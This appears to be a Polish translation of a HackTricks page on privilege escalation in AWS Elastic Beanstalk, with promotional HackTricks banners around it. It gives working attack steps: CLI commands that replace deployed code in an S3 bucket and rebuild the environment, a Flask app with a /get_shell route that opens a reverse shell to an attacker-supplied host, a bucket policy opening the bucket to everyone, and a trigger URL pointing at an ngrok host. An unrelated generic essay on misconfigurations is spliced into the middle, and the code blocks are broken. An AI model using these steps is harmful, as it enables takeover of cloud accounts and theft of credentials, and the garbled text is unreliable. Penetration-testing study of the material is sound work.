# AWS - Eskalacja uprawnień w Elastic Beanstalk

<details>

<summary><strong>Dowiedz się, jak hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Elastic Beanstalk

Więcej **informacji na temat Elastic Beanstalk** znajdziesz w:

{% content-ref url="../aws-services/aws-elastic-beanstalk-enum.md" %}
[aws-elastic-beanstalk-enum.md](../aws-services/aws-elastic-beanstalk-enum.md)
{% endcontent-ref %}

{% hint style="warning" %}
Aby wykonywać czynności o dużej wrażliwości w Beanstalk, będziesz potrzebować **wielu wrażliwych uprawnień w wielu różnych usługach**. Możesz sprawdzić na przykład uprawnienia przypisane do **`arn:aws:iam::aws:policy/AdministratorAccess-AWSElasticBeanstalk`**
{% endhint %}

### `elasticbeanstalk:RebuildEnvironment`, uprawnienia do zapisu w S3 i wiele innych

Posiadając **uprawnienia do zapisu w kubełku S3**, który zawiera **kod** środowiska oraz uprawnienia do **przebudowy** aplikacji (wymagane jest `elasticbeanstalk:RebuildEnvironment` oraz kilka innych związanych z `S3`, `EC2` i `Cloudformation`), można **modyfikować** kod, **przebudowywać** aplikację, a następnym razem, gdy uzyskasz dostęp do aplikacji, zostanie **wykonany twój nowy kod**, umożliwiając atakującemu skompromitowanie aplikacji i poświadczeń roli IAM.
```bash
# Create folder
mkdir elasticbeanstalk-eu-west-1-947247140022
cd elasticbeanstalk-eu-west-1-947247140022
# Download code
aws s3 sync s3://elasticbeanstalk-eu-west-1-947247140022 .
# Change code
unzip 1692777270420-aws-flask-app.zip
zip 1692777270420-aws-flask-app.zip <files to zip>
# Upload code
aws s3 cp 1692777270420-aws-flask-app.zip s3://elasticbeanstalk-eu-west-1-947247140022/1692777270420-aws-flask-app.zip
# Rebuild env
aws elasticbeanstalk rebuild-environment --environment-name "env-name"
```
{% endcode %}

### `elasticbeanstalk:CreateApplication`, `elasticbeanstalk:CreateEnvironment`, `elasticbeanstalk:CreateApplicationVersion`, `elasticbeanstalk:UpdateEnvironment`, `iam:PassRole`, i więcej...

Wymienione uprawnienia, a także kilka uprawnień **`S3`**, **`EC2`, `cloudformation`**, **`autoscaling`** i **`elasticloadbalancing`**, są niezbędne do utworzenia scenariusza Elastic Beanstalk od podstaw.

* Utwórz aplikację AWS Elastic Beanstalk:
```bash
aws elasticbeanstalk create-application --application-name MyApp
```
* Utwórz środowisko AWS Elastic Beanstalk ([**obsługiwane platformy**](https://docs.aws.amazon.com/elasticbeanstalk/latest/platforms/platforms-supported.html#platforms-supported.python)):

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk create-environment --application-name MyApp --environment-name MyEnv --solution-stack-name "64bit Amazon Linux 2 v3.4.2 running Python 3.8" --option-settings Namespace=aws:autoscaling:launchconfiguration,OptionName=IamInstanceProfile,Value=aws-elasticbeanstalk-ec2-role
```
{% endcode %}

Jeśli środowisko jest już utworzone i **nie chcesz tworzyć nowego**, możesz po prostu **zaktualizować** istniejące.

* Spakuj kod aplikacji i zależności do pliku ZIP:
```python
zip -r MyApp.zip .
```
* Prześlij plik ZIP do kubełka S3:
```python
aws s3 cp MyApp.zip s3://elasticbeanstalk-<region>-<accId>/MyApp.zip
```
* Utwórz wersję aplikacji AWS Elastic Beanstalk:

{% code overflow="wrap" %}
```css
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-1.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="MyApp.zip"
```
{% endcode %}

* Wdroż aplikację wersji do swojego środowiska AWS Elastic Beanstalk:

{% code overflow="wrap" %}
```bash
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0
```
{% endcode %}

### `elasticbeanstalk:CreateApplicationVersion`, `elasticbeanstalk:UpdateEnvironment`, `cloudformation:GetTemplate`, `cloudformation:DescribeStackResources`, `cloudformation:DescribeStackResource`, `autoscaling:DescribeAutoScalingGroups`, `autoscaling:SuspendProcesses`, `autoscaling:SuspendProcesses`

Po pierwsze, musisz utworzyć **legitymne środowisko Beanstalk** z **kodem**, który chcesz uruchomić na **ofierze**, postępując zgodnie z **poprzednimi krokami**. Potencjalnie prosty **zip** zawierający te **2 pliki**:

{% tabs %}
{% tab title="application.py" %}
```python
from flask import Flask, request, jsonify
import subprocess,os, socket

application = Flask(__name__)

@application.errorhandler(404)
def page_not_found(e):
return jsonify('404')

@application.route("/")
def index():
return jsonify('Welcome!')


@application.route("/get_shell")
def search():
host=request.args.get('host')
port=request.args.get('port')
if host and port:
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,int(port)))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
return jsonify('done')

if __name__=="__main__":
application.run()
```
{% tab title="requirements.txt" %}
```
click==7.1.2
Flask==1.1.2
itsdangerous==1.1.0
Jinja2==2.11.3
MarkupSafe==1.1.1
Werkzeug==1.0.1
```
{% endtab %}
{% endtabs %}

Gdy już masz **uruchomione swoje środowisko Beanstalk** z odwróconym powłoką, nadszedł czas, aby **przenieść** je do środowiska **ofiary**. Aby to zrobić, musisz **zaktualizować politykę kubełka** S3 swojego Beanstalk, aby **ofiara miała do niego dostęp** (Należy zauważyć, że to spowoduje **otwarcie** kubełka dla **KAŻDEGO**):
```json
{
"Version": "2008-10-17",
"Statement": [
{
"Sid": "eb-af163bf3-d27b-4712-b795-d1e33e331ca4",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"s3:ListBucket",
"s3:ListBucketVersions",
"s3:GetObject",
"s3:GetObjectVersion",
"s3:*"
],
"Resource": [
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022",
"arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022/*"
]
},
{
"Sid": "eb-58950a8c-feb6-11e2-89e0-0800277d041b",
"Effect": "Deny",
"Principal": {
"AWS": "*"
},
"Action": "s3:DeleteBucket",
"Resource": "arn:aws:s3:::elasticbeanstalk-us-east-1-947247140022"
}
]
}
```
# Eskalacja uprawnień w AWS Elastic Beanstalk

## Wprowadzenie

AWS Elastic Beanstalk to usługa chmurowa, która umożliwia łatwe wdrażanie, skalowanie i zarządzanie aplikacjami internetowymi. W ramach tej usługi, aplikacje są uruchamiane na instancjach EC2, a zarządzanie jest uproszczone dzięki automatycznemu skalowaniu i zarządzaniu infrastrukturą.

W przypadku eskalacji uprawnień w AWS Elastic Beanstalk, atakujący może uzyskać większe uprawnienia niż mu przysługują, co może prowadzić do nieautoryzowanego dostępu do zasobów i danych.

## Słabe konfiguracje

### 1. Wykorzystanie błędnej konfiguracji IAM

Jeśli użytkownik lub rola IAM ma nadmiarowe uprawnienia, atakujący może wykorzystać te uprawnienia do uzyskania dostępu do zasobów, do których nie powinien mieć dostępu. Może to obejmować dostęp do innych usług AWS lub manipulację konfiguracją aplikacji.

### 2. Wykorzystanie błędnej konfiguracji dostępu do bazy danych

Jeśli aplikacja korzysta z bazy danych, a jej konfiguracja dostępu jest nieprawidłowa, atakujący może uzyskać dostęp do bazy danych i wykonywać nieautoryzowane operacje, takie jak odczyt, modyfikacja lub usunięcie danych.

### 3. Wykorzystanie błędnej konfiguracji dostępu do plików

Jeśli aplikacja przechowuje poufne pliki na serwerze Elastic Beanstalk, a konfiguracja dostępu do tych plików jest nieprawidłowa, atakujący może uzyskać dostęp do tych plików i wykonywać nieautoryzowane operacje, takie jak odczyt, modyfikacja lub usunięcie.

## Wykorzystanie podatności

### 1. Wykorzystanie podatności w aplikacji

Atakujący może wykorzystać podatności w aplikacji uruchamianej na Elastic Beanstalk do uzyskania dostępu do zasobów lub danych. Może to obejmować podatności w kodzie aplikacji, niewłaściwe walidacje danych, błędy konfiguracji itp.

### 2. Wykorzystanie podatności w systemie operacyjnym

Jeśli instancje EC2 uruchamiane przez Elastic Beanstalk mają podatności w systemie operacyjnym, atakujący może wykorzystać te podatności do uzyskania dostępu do instancji i dalszej eskalacji uprawnień.

## Podsumowanie

Eskalacja uprawnień w AWS Elastic Beanstalk może prowadzić do nieautoryzowanego dostępu do zasobów i danych. Aby zabezpieczyć aplikacje uruchamiane na Elastic Beanstalk, należy skonfigurować odpowiednie uprawnienia IAM, dostęp do bazy danych i dostęp do plików. Ponadto, należy regularnie aktualizować aplikacje i system operacyjny, aby zapobiec wykorzystaniu podatności.
```bash
# Use a new --version-label
# Use the bucket from your own account
aws elasticbeanstalk create-application-version --application-name MyApp --version-label MyApp-2.0 --source-bundle S3Bucket="elasticbeanstalk-<region>-<accId>",S3Key="revshell.zip"

# These step needs the extra permissions
aws elasticbeanstalk update-environment --environment-name MyEnv --version-label MyApp-1.0

# To get your rev shell just access the exposed web URL with params such as:
http://myenv.eba-ankaia7k.us-east-1.elasticbeanstalk.com/get_shell?host=0.tcp.eu.ngrok.io&port=13528
```
{% endcode %}

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
